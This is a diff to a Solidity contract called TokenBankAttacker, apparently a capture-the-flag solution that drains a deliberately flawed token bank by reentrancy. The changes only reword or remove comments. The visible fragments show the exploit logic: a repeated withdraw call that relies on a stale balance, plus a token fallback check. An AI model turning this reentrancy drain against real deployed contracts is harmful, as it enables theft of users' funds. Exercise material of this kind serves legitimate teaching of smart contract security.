@@ -28,7 +28,6 @@ contract TokenBankAttacker {
     }
 
     function deposit() external payable {
-        // this one from the token contract updates after withdraw
         uint256 myBalance = challenge.token().balanceOf(address(this));
         // deposit is handled in challenge's tokenFallback
         challenge.token().transfer(address(challenge), myBalance);
@@ -36,7 +35,7 @@ contract TokenBankAttacker {
 
     function attack() external payable {
         callWithdraw();
-        // if we guessed wrong, revert
+        // if something went wrong, revert
         require(challenge.isComplete(), "challenge not completed");
     }
 
@@ -49,7 +48,6 @@ contract TokenBankAttacker {
             msg.sender == address(challenge.token()),
             "not from original token"
         );
-        // if(msg.sender != address(challenge.token())) return;
 
         // when attacker EOA deposits, ignore
         if (from != address(challenge)) return;
@@ -58,9 +56,9 @@ contract TokenBankAttacker {
     }
 
     function callWithdraw() private {
-        // this one is the bugged one that does not update after withdraw
+        // this one is the bugged one, does not update after withdraw
         uint256 myInitialBalance = challenge.balanceOf(address(this));
-        // this one from the token contract updates after withdraw
+        // this one from the token contract, updates after withdraw
         uint256 challengeTotalRemainingBalance =
             challenge.token().balanceOf(address(challenge));
         // are there more tokens to empty?
